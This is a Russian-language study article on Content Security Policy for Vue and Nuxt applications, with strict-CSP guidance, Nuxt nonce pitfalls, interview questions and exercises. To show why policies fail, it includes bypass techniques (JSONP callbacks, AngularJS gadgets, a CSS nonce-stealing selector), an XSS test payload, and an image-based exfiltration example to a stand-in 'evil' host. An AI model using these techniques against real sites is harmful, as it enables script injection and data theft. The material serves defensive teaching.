---
title: Content Security Policy
level: ядро
---

# Content Security Policy

> **Коротко.** **CSP** (Content Security Policy, политика безопасности контента) — заголовок, в котором сервер перечисляет, какие скрипты, стили, фреймы и запросы браузеру разрешено выполнять на странице. Это не защита от XSS, а ограничение ущерба: даже внедрённый `<script>` или `onerror` не выполнится. Списки доверенных доменов (allowlist) обходятся, поэтому сегодня делают **strict CSP**: `script-src` с `nonce` или `hash` и `'strict-dynamic'`, плюс `object-src 'none'` и `base-uri 'none'`. Во Vue/Nuxt важны три вещи: компилятор шаблонов в runtime требует `'unsafe-eval'`, nonce должен быть уникальным для каждого ответа (это конфликтует с кэшированием HTML), а `style=""` из SSR блокируется строгим `style-src`.

**Связанные темы:** [XSS и безопасный вывод во Vue](./xss.md), [HTTP-кэширование и CDN](../network/caching.md), [HTTP: методы, статусы, заголовки, версии](../network/http.md), [Web Workers, Service Workers и PWA](../browser/workers.md), [Оптимизация загрузки](../performance/loading.md)

## Теория

### Модель: политика, директивы, источники

Политика — это список **директив** через `;`, у каждой директивы список **источников**:

```http
Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'nonce-r4nd0m' 'strict-dynamic'
```

**Fetch-директивы** управляют загрузкой ресурсов по типам: `script-src`, `style-src`, `img-src`, `font-src`, `connect-src` (`fetch`, XHR, WebSocket, `EventSource`), `media-src`, `object-src`, `frame-src`, `worker-src`, `manifest-src`. Если нужной директивы нет, браузер берёт следующую в цепочке **fallback**:

| Проверка | Цепочка |
| --- | --- |
| `<script>` | `script-src-elem` → `script-src` → `default-src` |
| `onclick="…"`, `javascript:` | `script-src-attr` → `script-src` → `default-src` |
| `<style>`, `<link rel=stylesheet>` | `style-src-elem` → `style-src` → `default-src` |
| атрибут `style="…"` | `style-src-attr` → `style-src` → `default-src` |
| `<iframe>` | `frame-src` → `child-src` → `default-src` |
| Worker | `worker-src` → `child-src` → `script-src` → `default-src` |

Fallback работает целиком, без слияния. Если `script-src` указана, `default-src` для скриптов не участвует вообще.

Остальные директивы не загрузочные и в `default-src` не откатываются: `base-uri` (что можно поставить в `<base>`), `form-action` (куда можно отправлять формы), `frame-ancestors` (кто может встроить страницу), `sandbox`, `upgrade-insecure-requests`, `report-to`, `require-trusted-types-for` и `trusted-types`.

**Источники:**

- `'self'` — origin документа; `'none'` — ничего.
- Хост: `https://cdn.example.com`, `*.example.com`, с путём или без. Схема: `https:`, `data:`, `blob:`.
- `'nonce-<base64>'` — элемент с таким атрибутом `nonce`; `'sha256-<base64>'` — инлайн-содержимое с таким хэшем.
- Ключевые слова: `'strict-dynamic'`, `'unsafe-inline'`, `'unsafe-eval'`, `'wasm-unsafe-eval'`, `'unsafe-hashes'`, `'report-sample'`.

Ключевые слова пишутся **в одинарных кавычках**. `self` без кавычек — это хост с именем `self`.

Если политик несколько (два заголовка или заголовок плюс `<meta>`), ресурс должен пройти **каждую**. Вторая политика может только ужесточить первую. На стенде (Chromium 157) `script-src 'nonce-a' 'unsafe-eval'` вместе с `script-src 'nonce-a'` дают `EvalError`.

### Что CSP блокирует в скриптах

Если в `script-src` нет `'unsafe-inline'`, блокируются инлайновые `<script>` без nonce или hash, атрибуты-обработчики `on*` и навигация на `javascript:`. Если нет `'unsafe-eval'`, блокируются `eval`, `new Function` и строковые `setTimeout`/`setInterval`. Первые два бросают `EvalError`. Строковый таймер на стенде не бросил исключение, а просто не выполнился, оставив отчёт о нарушении. Это как раз то, что делает XSS: обработчик `onerror`, `<script>` в разметке сервера, `javascript:` в ссылке.

### Почему allowlist-CSP обходится

Классическая политика перечисляет доверенные домены: `script-src 'self' https://cdn.jsdelivr.net https://www.google.com`. Атакующему не нужен свой домен. Ему достаточно найти на разрешённом домене то, что исполнит его код:

- **JSONP-эндпоинт**: `<script src="https://allowed.example/api?callback=alert">` возвращает `alert(…)`. На стенде политика `script-src 'self'` пропустила `<script src="/jsonp?callback=L">`, и колбэк выполнился.
- **Script gadgets**: библиотека на публичном CDN, которая исполняет выражения из разметки. Классический пример — AngularJS: подключаем его с разрешённого CDN, и <code v-pre>{{ … }}</code> в атрибутах становится кодом.
- **Пользовательские загрузки** на том же origin. `'self'` разрешает и `/uploads/avatar.js`.
- **Open redirect**: по CSP3 путь в host-source после редиректа не проверяется.

По данным исследования Google «CSP Is Dead, Long Live CSP!» (2016), около 95 % реальных политик обходились тривиально. Спецификация CSP3 прямо пишет, что host- и path-политики трудно сделать правильно, особенно на CDN.

### Strict CSP: nonce, hash, strict-dynamic

Strict CSP доверяет не домену, а **конкретному тегу**:

```http
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
```

- **Nonce** (number used once) — случайное значение, не меньше 128 бит, в base64, **новое на каждый ответ**. Сервер ставит его в заголовок и в атрибут `nonce` своих `<script>`. Атакующий не знает значение заранее, поэтому его внедрённый тег не выполнится.
- **Hash** — `'sha256-…'` от точного содержимого инлайнового скрипта. Подходит для статического HTML, где nonce негде генерировать. По CSP3 hash может разрешать и внешний скрипт с атрибутом `integrity`, если все хэши в `integrity` есть в политике. По MDN BCD это поддерживают Chrome 59, Firefox 116 и Safari 15.6.
- **`'strict-dynamic'`** — доверие передаётся дальше. Скрипт, который уже прошёл проверку, может загрузить другие через **non-parser-inserted** элементы (`document.createElement('script')` и вставка в DOM). Так работают загрузчики аналитики и ленивые чанки. При этом host-source, scheme-source, `'self'` и `'unsafe-inline'` игнорируются. Скрипт, вставленный парсером (`document.write('<script src>')`, `<script src>` в разметке без nonce), блокируется даже с разрешённого домена. Всё это проверено на стенде.
- **`object-src 'none'`** закрывает `<object>`/`<embed>`, через которые раньше исполнялись плагины. **`base-uri 'none'`** не даёт внедрённому `<base href>` переписать относительные `src` ваших скриптов. На стенде `<base>` заблокирован, `document.baseURI` остался прежним.

Хвост `https: 'unsafe-inline'` — фолбэк для старых браузеров, и он не ослабляет политику. Браузер с поддержкой `'strict-dynamic'` игнорирует `https:`. Браузер, который понимает nonce, игнорирует `'unsafe-inline'`. Самым старым браузерам остаётся «как без CSP».

Импорты модуля, загруженного с nonce, тоже доверенные: HTML Standard передаёт nonce родителя в параметры загрузки дочерних модулей. На стенде `<script type="module" nonce>` импортировал `/vue.js` под политикой без `'self'`.

> [!WARNING]
> Strict CSP защищает от **внедрения нового** скрипта, но не от ошибок **в доверенном**. С `'strict-dynamic'` код вида `s = createElement('script'); s.src = location.hash.slice(1)` загрузит что угодно: его создал доверенный скрипт. От такого DOM XSS защищает Trusted Types: `script.src` перестаёт принимать строки. Кроме того, CSP почти не мешает внедрению разметки без скрипта: поддельной форме (ограничивается `form-action`), dangling markup, утечке данных через CSS.

**Сокрытие nonce.** Если nonce можно прочитать со страницы, его можно украсть, например CSS-селектором `script[nonce^="a"]` с фоновой картинкой. Поэтому HTML Standard **скрывает** nonce: когда политика пришла **заголовком**, после вставки элемента `getAttribute('nonce')` возвращает `''`, а значение остаётся только в свойстве `el.nonce`. На стенде селектор `script[nonce^="a"]` ничего не нашёл. Если CSP пришла через `<meta>`, nonce не скрывается: `getAttribute` вернул значение. Кроме того, по CSP3 элемент, у которого в имени или значении любого атрибута есть `<script` или `<style`, не может использовать nonce. Это защита от dangling markup, когда незакрытый атрибут «съедает» чужой тег вместе с nonce.

### `'unsafe-inline'`, `'unsafe-eval'`, `'wasm-unsafe-eval'`, `'unsafe-hashes'`

- **`'unsafe-inline'`** разрешает все инлайновые скрипты и обработчики, то есть отключает главную защиту от XSS. Если в той же директиве есть nonce или hash, браузер его **игнорирует**. Chromium прямо пишет об этом в консоли.
- **`'unsafe-eval'`** разрешает компиляцию строк в код: `eval`, `new Function`, строковые таймеры, а заодно и компиляцию WebAssembly. Атакующий, который управляет строкой в `eval`, получает выполнение кода, поэтому директиву стараются не включать.
- **`'wasm-unsafe-eval'`** разрешает только компиляцию WebAssembly, без `eval`. Поддержка: Chrome 97, Firefox 102, Safari 16.
- **`'unsafe-hashes'`** позволяет хэшам совпадать с атрибутами-обработчиками и `style=""`. Это костыль для легаси: CSP3 советует его избегать.
- **`'trusted-types-eval'`** вместе с `require-trusted-types-for 'script'` разрешает `eval` только для `TrustedScript`. Поддержка: Chrome 145, Firefox 148, Safari 26.

### Стили

Для стилей действуют те же правила: без `'unsafe-inline'` блокируются `<style>` без nonce или hash и атрибуты `style="…"`. Результаты стенда (Chromium 157, `style-src 'self' 'nonce-…'`):

| Способ | Результат |
| --- | --- |
| `<style>` в HTML без nonce / с nonce | заблокирован / применён |
| `style="…"` в HTML | заблокирован |
| `el.setAttribute('style', …)` | заблокирован |
| `el.style.color = …`, `el.style.cssText = …` | применён |
| `document.createElement('style')` без nonce | заблокирован |
| `new CSSStyleSheet()` + `adoptedStyleSheets` | применён |

> [!WARNING]
> В тексте CSP3 вызовы сеттеров `cssText` и `insertRule` отнесены к проверкам `'unsafe-eval'` в `style-src`, сама спецификация помечает это место как требующее доработки. Chromium их не блокирует. Опирайтесь на поведение браузеров, а не на этот абзац спецификации.

`'unsafe-inline'` в `style-src` считается приемлемым компромиссом. Скрипт через CSS не выполнить, но остаётся утечка данных: селектор по значению атрибута плюс `background: url(...)`. Её ограничивают `img-src` и `font-src`. Важно, что nonce или hash в `style-src` отключают `'unsafe-inline'` и там.

### Доставка: заголовок, `<meta>`, Report-Only

Основной способ доставки — заголовок `Content-Security-Policy`. `<meta http-equiv="Content-Security-Policy">` подходит для статического хостинга без контроля заголовков, но у него есть ограничения:

- он действует только на то, что парсер встретит **после** него: скрипт до `<meta>` на стенде выполнился;
- `frame-ancestors`, `report-uri` и `sandbox` в нём игнорируются (Chromium предупреждает в консоли), Report-Only через `<meta>` невозможен;
- nonce не скрывается (см. выше).

**`Content-Security-Policy-Report-Only`** ничего не блокирует, только сообщает о нарушениях: на стенде инлайновый скрипт выполнился, а событие пришло с `disposition: "report"`. Оба заголовка можно отдавать одновременно: старая политика действует, новая собирает отчёты. Так CSP и внедряют.

Куда отправлять отчёты:

```http
Reporting-Endpoints: csp="https://example.com/csp-reports"
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic' 'report-sample'; report-to csp; report-uri https://example.com/csp-reports
```

`report-to` работает через Reporting API: отчёты (`application/reports+json`) ставятся в очередь и отправляются пакетами, с задержкой. Поддержка `report-to`: Chrome 70, Safari 16.4, Firefox только со 149. Поэтому `report-uri` (устарела, отправляет по одному `application/csp-report`) пока оставляют вторым каналом. `'report-sample'` добавляет в отчёт первые 40 символов заблокированного кода. Внутри страницы нарушения видны сразу, по событию `securitypolicyviolation`. Значительную часть отчётов создают расширения браузера, поэтому их фильтруют по `source-file` и `blocked-uri`.

### `frame-ancestors`

`frame-ancestors` задаёт, **кто может встроить** страницу во фрейм: `'none'` примерно равно `X-Frame-Options: DENY`, `'self'` — `SAMEORIGIN`, плюс можно перечислить origin. Директива проверяет всю цепочку предков, а не только родителя. В `default-src` она не откатывается и в `<meta>` не работает. Если она задана, браузеры игнорируют `X-Frame-Options`. Защита от clickjacking подробнее — в теме [CSRF, clickjacking и supply chain](./csrf-and-clickjacking.md#clickjacking).

### Trusted Types в политике

`require-trusted-types-for 'script'` заставляет опасные приёмники DOM (`innerHTML`, `script.src`, `eval`…) принимать только типизированные объекты. `trusted-types <имена>` перечисляет политики, которые разрешено создавать (`'allow-duplicates'` разрешает повторные имена, `'none'` запрещает все). Strict CSP закрывает внедрение новых скриптов, Trusted Types — DOM XSS в доверенном коде. Механика и ловушка с политикой `vue` подробно — в [XSS и безопасный вывод во Vue](./xss.md#trusted-types).

### Vue: компилятор в runtime и `:style`

- **Компилятор шаблонов в runtime** превращает строку шаблона в функцию через `new Function` (`compileToFunction` в пакете `vue`, сверено с исходниками 3.5.45). На стенде `createApp({ template: '…' })` из `vue.esm-browser.prod.js` без `'unsafe-eval'` упал с `EvalError`, а с ним смонтировался. SFC, собранные Vite (по умолчанию в Vite и Nuxt), компилируются при сборке, и `'unsafe-eval'` им не нужен: по документации Vue стандартные сборки используют runtime-only вариант без компилятора.
- **`:style` на клиенте** ставится через CSSOM (`style.setProperty`, для строки — `cssText`), поэтому строгий `style-src` его не блокирует: на стенде применились и объект, и строка. Через тот же `style.display` работает `v-show`.
- **`:style` при SSR** отрисовывается атрибутом `style="…"` в HTML и **блокируется**. Гидрация его не чинит: при гидрации Vue не ставит атрибут `style` заново, а берёт готовый элемент. Стенд Nuxt 4.6.4 со `style-src 'self' 'nonce-…'`: после гидрации цвет так и остался чёрным. Вывод: строгий `style-src` в SSR-приложении требует отказаться от `:style` в серверной разметке (только классы и CSS-переменные в `<style>` с nonce) или оставить `'unsafe-inline'` для стилей.

### Nuxt: откуда берётся nonce

Сам Nuxt (сверено с 4.6.4) заголовок CSP не ставит и nonce не генерирует. При SSR он по умолчанию **инлайнит CSS компонентов** в `<style>` (`features.inlineStyles`), так что `style-src` нужен nonce, hash или `'unsafe-inline'`. Обычно CSP включают модулем **nuxt-security** (сверено с 2.7.0, исходники `src/runtime/nitro/plugins`):

- на хуке Nitro `request` генерируется nonce (18 случайных байт, base64), на `render:html` он **регулярным выражением** дописывается во все `<script>`, `<style>` и `<link>` в `head` и `body` готового HTML, а плейсхолдер <code v-pre>'nonce-{{nonce}}'</code> в заголовке заменяется значением;
- в компонентах nonce доступен через `useNonce()`;
- политика по умолчанию: <code v-pre>script-src 'self' https: 'unsafe-inline' 'strict-dynamic' 'nonce-{{nonce}}'</code>, `script-src-attr 'none'`, `style-src 'self' https: 'unsafe-inline'`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'self'`;
- при пререндере (SSG) nonce невозможен, поэтому модуль считает хэши инлайновых скриптов и кладёт политику в `<meta>`.

> [!WARNING]
> «Проставить nonce во все теги готового HTML» значит дать nonce и тому, что внедрил атакующий. На стенде (Nuxt 4.6.4 + nuxt-security 2.7.0) `<script>` из `v-html` в серверной разметке получил nonce и **выполнился**. `<img onerror>` из той же строки остановил только `script-src-attr 'none'`. Для stored XSS через SSR такая CSP не работает, поэтому серверная санитизация `v-html` обязательна (см. [XSS](./xss.md#xss-и-гидрация)). Правильная модель — nonce ставит шаблон, который вы контролируете, а не постобработка всего вывода.

### Nonce и кэширование HTML

Nonce должен быть уникальным для каждого ответа. Кэш (CDN, `routeRules` с `swr`/`isr` в Nitro, Service Worker) отдаёт всем один и тот же HTML с одним и тем же nonce. Его видит любой, кто открыл страницу, и он годится для внедрения: например, `<iframe srcdoc>` наследует политику, и `<script nonce="известный">` внутри него выполнится. Варианты:

1. Не кэшировать HTML в общих кэшах (`Cache-Control: private, no-store` или `no-cache` с ревалидацией), кэшировать только ассеты и данные. См. [HTTP-кэширование и CDN](../network/caching.md).
2. Подменять nonce на edge: воркер CDN генерирует значение и переписывает и заголовок, и атрибуты в закэшированной копии. Требование то же — переписывать только свои теги.
3. Перейти на **hash-based** CSP для статических и пререндеренных страниц. Её можно кэшировать: хэш одинаков для всех. Так web.dev рекомендует для статического HTML и SPA.

## Примеры

Strict CSP с nonce на голом Node.js: nonce вставляется в собственный шаблон, а не в итоговый HTML.

```js
import http from 'node:http'
import { randomBytes } from 'node:crypto'

const policy = (nonce) => [
  `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
  `object-src 'none'`,
  `base-uri 'none'`,
  `frame-ancestors 'self'`,
  `report-to csp`,
].join('; ')

http.createServer((req, res) => {
  const nonce = randomBytes(16).toString('base64') // 128 bits, new for every response
  res.setHeader('Content-Security-Policy', policy(nonce))
  res.setHeader('Reporting-Endpoints', 'csp="/csp-reports"')
  res.setHeader('Cache-Control', 'private, no-store') // a shared cache would freeze the nonce
  res.setHeader('Content-Type', 'text/html; charset=utf-8')
  res.end(`<!doctype html>
<div id="app"></div>
<script nonce="${nonce}" type="module" src="/assets/main.js"></script>`)
}).listen(3000)
```

Поэтапное включение: старая политика действует, новая собирает отчёты.

```http
Content-Security-Policy: script-src 'self' https://cdn.example.com 'unsafe-inline'
Content-Security-Policy-Report-Only: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; report-to csp
Reporting-Endpoints: csp="https://example.com/csp-reports"
```

Нарушения на самой странице (удобно для отладки и e2e-тестов):

```js
document.addEventListener('securitypolicyviolation', (e) => {
  console.warn(e.effectiveDirective, e.disposition, e.blockedURI, e.sample)
})
```

Strict-политика в Nuxt через nuxt-security:

```ts
// nuxt.config.ts
export default defineNuxtConfig({
  modules: ['nuxt-security'],
  security: {
    nonce: true,
    headers: {
      contentSecurityPolicy: {
        'script-src': ["'nonce-{{nonce}}'", "'strict-dynamic'", 'https:', "'unsafe-inline'"],
        'script-src-attr': ["'none'"],
        'style-src': ["'self'", "'unsafe-inline'"], // SSR :style needs it, see above
        'object-src': ["'none'"],
        'base-uri': ["'none'"],
        'frame-ancestors': ["'self'"],
      },
    },
  },
})
```

## Вопросы с интервью

::: details Почему CSP со списком доверенных доменов почти не защищает и что такое strict CSP
Allowlist доверяет домену целиком, а на популярном домене почти всегда найдётся то, что исполнит чужой код: JSONP-эндпоинт с `callback`, библиотека-гаджет (AngularJS исполняет выражения из разметки), пользовательские загрузки на `'self'`, open redirect (путь после редиректа не проверяется). Исследование Google 2016 года показало, что около 95 % реальных политик обходятся. Strict CSP доверяет не домену, а тегу: `script-src 'nonce-…' 'strict-dynamic'` (или hash), плюс `object-src 'none'` и `base-uri 'none'`. Внедрённый тег не знает nonce, а загрузчики работают через `'strict-dynamic'`. Обслуживать её проще: список доменов не нужен.
:::

::: details Что делает strict-dynamic и почему скрипт из document.write блокируется
`'strict-dynamic'` переносит доверие с проверенного скрипта на скрипты, которые он создаёт как non-parser-inserted (`createElement('script')` и вставка в DOM). Одновременно игнорируются host- и scheme-источники, `'self'` и `'unsafe-inline'`. Скрипты, вставленные парсером (`<script src>` в разметке без nonce, `document.write('<script src>')`), блокируются, даже если домен был бы разрешён: так внедрённая разметка не наследует доверие. Отсюда типичная поломка старых виджетов на `document.write`. Ограничение: если доверенный код сам кладёт в `src` данные атакующего, `'strict-dynamic'` это пропустит. Здесь нужны Trusted Types.
:::

::: details Почему в рекомендуемой политике одновременно стоят nonce, https: и unsafe-inline
Это слои обратной совместимости, и каждый браузер видит свою политику. Современный понимает `'strict-dynamic'`, поэтому `https:` для него не действует, а nonce отключает `'unsafe-inline'`: работает только nonce. Браузер без `'strict-dynamic'`, но с nonce получает «nonce плюс любые скрипты по HTTPS». Совсем старый браузер без nonce видит `'unsafe-inline' https:`, то есть почти отсутствие CSP, но страница у него не ломается. Политика деградирует, но не становится строже, чем страница выдержит.
:::

::: details Чем CSP в meta отличается от CSP в заголовке
`<meta http-equiv>` начинает действовать с того места, где его встретил парсер: всё, что выше, уже выполнилось. В нём игнорируются `frame-ancestors`, `report-uri` и `sandbox`, и нет режима Report-Only. Nonce при meta-политике не скрывается: `getAttribute('nonce')` возвращает значение, а при политике из заголовка — пустую строку. Meta-политики складываются с заголовочными, ресурс должен пройти все. Meta подходит для статического хостинга с hash-based политикой. Если можно управлять заголовками, лучше заголовок.
:::

::: details Как внедрить CSP в большое существующее приложение и ничего не сломать
Начать с `Content-Security-Policy-Report-Only` и целевой strict-политики, отчёты слать через `report-to` (и `report-uri` для старых Firefox). Собрать нарушения, отфильтровать шум от расширений. Убрать причины: инлайновые обработчики заменить на `addEventListener`, `javascript:` — на кнопки, `eval` и `new Function` — на обычный код (во Vue — runtime-only сборка), `document.write`-виджеты — на загрузку через `createElement`. Добавить nonce в серверный шаблон. Пока Report-Only показывает только шум, перевести политику в enforce, оставив Report-Only для следующего ужесточения (`require-trusted-types-for`). Деплоить можно независимо: две политики живут одновременно.
:::

::: details Почему Vue-приложению с шаблонами в runtime нужен unsafe-eval, а приложению на SFC — нет
Полная сборка Vue компилирует строку `template` в render-функцию через `new Function`, а CSP без `'unsafe-eval'` бросает на этом `EvalError`. В SFC шаблон компилируется при сборке (`@vitejs/plugin-vue`, Nuxt), в бандле уже готовая функция, и в runtime eval не нужен. Отсюда правило: под строгий CSP — только runtime-only сборка, никаких in-DOM шаблонов и `template:` строкой. Заодно это закрывает внедрение шаблонов из пользовательских данных. Если без компиляции в рантайме нельзя, лучше компилировать на сервере, чем включать `'unsafe-eval'` для всего приложения.
:::

::: details Как совместить CSP с nonce и кэширование HTML на CDN
Никак напрямую: nonce уникален для каждого ответа, а закэшированный HTML отдаёт всем один nonce, и он становится публичным. Варианты: не кэшировать HTML в общих кэшах (`private`/`no-store`) и кэшировать ассеты и данные; генерировать nonce на edge и переписывать заголовок и свои теги в закэшированной копии; для статических и пререндеренных страниц перейти на hash-based CSP, где хэш одинаков для всех и кэшу не мешает. В Nuxt то же касается `routeRules` с `swr`/`isr`: Nitro кэширует ответ вместе с nonce.
:::

## Задачи

### 1. Найти дыры в политике · легко

Что не так с политикой, и как её исправить?

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline' 'unsafe-eval'; img-src *; style-src 'self' 'unsafe-inline'
```

::: details Решение и разбор
1. `'unsafe-inline'` в `script-src` без nonce или hash разрешает инлайновые скрипты и `onerror`. От XSS политика не защищает.
2. `https://cdn.jsdelivr.net` — публичный CDN с любым npm-пакетом. Атакующий подключит оттуда AngularJS или другой гаджет.
3. `'self'` — если на origin есть пользовательские загрузки или JSONP, это тоже обход.
4. `'unsafe-eval'` — строковый eval-приёмник становится выполнением кода.
5. Нет `object-src` и `base-uri`. `object-src` откатится в `default-src 'self'` (терпимо), а `base-uri` в `default-src` не откатывается вообще: внедрённый `<base>` перенаправит относительные скрипты.
6. `img-src *` — канал утечки данных через `<img src="https://evil/?d=…">`, в том числе через CSS-инъекцию.
7. Нет `frame-ancestors` — страницу можно встроить чужим сайтом.

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline'; object-src 'none'; base-uri 'none'; img-src 'self' data: https://img.example.com; style-src 'self' 'unsafe-inline'; frame-ancestors 'self'; report-to csp
```

`'unsafe-inline'` здесь остаётся только как фолбэк: при nonce он игнорируется.
:::

### 2. Hash для инлайнового скрипта · легко

Напишите `cspHash(source)`, который возвращает источник CSP вида `'sha256-…'` для содержимого инлайнового `<script>`. Почему hash ломается от переформатирования?

::: details Решение и разбор
```js
export async function cspHash(source) {
  const bytes = new TextEncoder().encode(source) // UTF-8, exactly what is between the tags
  const digest = await crypto.subtle.digest('SHA-256', bytes)
  const base64 = btoa(String.fromCharCode(...new Uint8Array(digest)))
  return `'sha256-${base64}'`
}

await cspHash("console.log('hi')") // "'sha256-…'" — paste into script-src
```

Хэшируется **точный** текст между `<script>` и `</script>`, включая пробелы и переводы строк. Минификатор, другой отступ или CRLF вместо LF дают другой хэш. Поэтому хэши считают после сборки, из финального HTML: так делает nuxt-security при SSG. Хэш разрешает конкретное содержимое, а не тег. Если в скрипт попадают данные (`window.__STATE__ = …`), хэш придётся пересчитывать на каждый ответ, и проще использовать nonce или `<script type="application/json">`, который CSP не проверяет как скрипт. Chromium сам подсказывает нужный хэш в сообщении о нарушении.

Сложность: O(n) по длине скрипта.
:::

### 3. Почему после включения CSP сломалось Nuxt-приложение · средне

После включения `script-src 'nonce-…' 'strict-dynamic'; style-src 'self' 'nonce-…'` в Nuxt-приложении: (а) часть элементов потеряла цвет и отступы после первой загрузки, но после клиентской навигации всё в порядке; (б) виджет поддержки не появляется; (в) на одной странице упал `EvalError`; (г) кнопки в HTML-описании товара из CMS не работают. Объясните каждое.

::: details Решение и разбор
**(а)** `:style` в SSR рендерится атрибутом `style="…"`, а `style-src` с nonce блокирует его (nonce отключает `'unsafe-inline'`). Гидрация стиль не перезаписывает. При клиентской навигации Vue создаёт элементы сам и ставит стиль через CSSOM, который CSP не блокирует, поэтому там всё нормально. Решение: стили через классы или CSS-переменные в `<style>` либо `'unsafe-inline'` в `style-src` без nonce.

**(б)** Виджет подключается через `document.write` или `<script src>` в разметке, вставленной через `innerHTML`. Такие скрипты parser-inserted, и `'strict-dynamic'` им доверие не передаёт. Нужно грузить его через `createElement('script')` из доверенного кода (`useScript`, плагин).

**(в)** Компонент с `template:` строкой или `compile()` — компилятор в runtime использует `new Function`. Переписать на SFC или отрендерить на сервере.

**(г)** В HTML из CMS — `onclick="…"`: атрибуты-обработчики под strict CSP не работают. Это и есть защита от XSS, а не баг. Обработчики делегировать на контейнер (`addEventListener` и `data-action`), а HTML санитизировать.
:::

### 4. Где ставить nonce · средне

Коллега предлагает middleware: «после рендера найти регуляркой все `<script` в HTML и дописать им `nonce`». Чем это плохо? Как сделать правильно в своём SSR-сервере?

::: details Решение и разбор
Постобработка не отличает ваш `<script>` от внедрённого. Комментарий, отрисованный сервером через `v-html` с `<script>alert(1)</script>`, тоже получит nonce и выполнится: CSP с такой middleware от stored XSS не защищает. Именно это происходит в nuxt-security 2.7.0 (проверено на стенде). Регулярка ещё и хрупкая: `<script` внутри атрибута или комментария, разные регистры.

Правильно: nonce попадает **только** в теги, которые создаёт ваш шаблон или фреймворк. Пользовательский контент к этому моменту уже экранирован или санитизирован.

```js
function renderDocument({ appHtml, nonce, entry, stateJson }) {
  // appHtml is the output of renderToString: user content inside it is escaped or sanitized
  return `<!doctype html>
<html><head>
  <script nonce="${nonce}" type="module" src="${entry}"></script>
</head><body>
  <div id="app">${appHtml}</div>
  <script type="application/json" id="state">${stateJson}</script>
</body></html>`
}
```

Состояние — в `type="application/json"`: это не исполняемый скрипт, nonce ему не нужен, а экранирование `<` всё равно обязательно (см. XSS). Если фреймворк сам добавляет служебные инлайновые скрипты, он должен принимать nonce параметром, а не получать его постобработкой. Дополнительный слой — `script-src-attr 'none'`: обработчики `on*` не выполнятся даже с ошибкой выше.
:::

### 5. CSP для Nuxt-магазина · сложно

Спроектируйте CSP для Nuxt-приложения: SSR для карточек товара с кэшем на CDN, пререндеренные лендинги, Google Tag Manager, отзывы с HTML, встраивание страницы товара на сайты партнёров.

::: details Решение и разбор
**Скрипты.** Strict CSP: `script-src 'nonce-…' 'strict-dynamic' https: 'unsafe-inline'; script-src-attr 'none'; object-src 'none'; base-uri 'none'`. GTM загружается доверенным скриптом и подгружает теги через `createElement`, `'strict-dynamic'` это пропускает. Но всё, что добавят маркетологи в GTM, исполнится — это вопрос доступа к GTM, а не CSP. Пользовательские HTML-теги GTM, которые сами вставляют `<script>` через `document.write`, сломаются.

**Кэш и nonce.** Карточки товара кэшируются CDN, поэтому nonce в HTML нельзя заморозить. Варианты: HTML с `Cache-Control: private, no-store` и кэш только API-ответов и ассетов; либо edge-воркер, который генерирует nonce на каждый ответ и подставляет его в заголовок и в свои теги. Лендинги пререндерены, у них hash-based политика (nuxt-security в SSG считает хэши и кладёт их в `<meta>`). Для `<meta>` помнить: нет `frame-ancestors` и Report-Only, поэтому заголовки лучше выставлять на CDN.

**Отзывы.** HTML санитизируется **на сервере** до рендера: постобработка nonce в nuxt-security проставит его и во внедрённый `<script>`. Для глубокой обороны — Trusted Types: `require-trusted-types-for 'script'; trusted-types reviews`, без политики `vue` (см. XSS), сначала в Report-Only.

**Стили.** Nuxt инлайнит CSS компонентов, а `:style` в SSR даёт `style="…"`. Реалистично `style-src 'self' 'unsafe-inline'` без nonce и жёсткий `img-src`/`font-src`, чтобы CSS-инъекция не могла никуда отправить данные.

**Встраивание.** `frame-ancestors 'self' https://partner-a.example https://partner-b.example` только для маршрутов товара (`routeRules`), а для корзины и аккаунта — `frame-ancestors 'none'`. Политика по маршруту действует при полной загрузке: после клиентской навигации остаётся политика первой страницы.

**Внедрение и контроль.** Сначала Report-Only с `report-to` и `report-uri`, `'report-sample'`, фильтр шума от расширений. Затем enforce. В CI — e2e-тест, который падает на любом `securitypolicyviolation`.
:::

## Источники

- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [HTML Standard: nonce attributes (сокрытие nonce)](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes)
- [HTML Standard: the meta element, Content-Security-Policy state](https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv-content-security-policy)
- [W3C: Reporting API](https://w3c.github.io/reporting/)
- [W3C: Trusted Types](https://w3c.github.io/trusted-types/dist/spec/)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [MDN: Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)
- [MDN browser-compat-data 8.1.9](https://github.com/mdn/browser-compat-data)
- [web.dev: Mitigate cross-site scripting (XSS) with a strict Content Security Policy](https://web.dev/articles/strict-csp)
- [Weichselbaum et al.: CSP Is Dead, Long Live CSP! (ACM CCS 2016)](https://research.google/pubs/csp-is-dead-long-live-csp-on-the-insecurity-of-whitelists-and-the-future-of-content-security-policy/)
- [Vue.js: Security](https://vuejs.org/guide/best-practices/security.html)
- [Vue.js: Tooling — runtime-only vs full build](https://vuejs.org/guide/scaling-up/tooling.html#note-on-in-browser-template-compilation)
- [Исходники Vue: `compileToFunction` в пакете `vue`](https://github.com/vuejs/core/blob/main/packages/vue/src/index.ts)
- [Nuxt: features.inlineStyles](https://nuxt.com/docs/4.x/api/nuxt-config#inlinestyles)
- [nuxt-security: Strict CSP](https://nuxt-security.vercel.app/advanced/strict-csp)
- [Исходники nuxt-security: Nitro-плагины nonce и CSP](https://github.com/Baroshem/nuxt-security/tree/main/src/runtime/nitro/plugins)
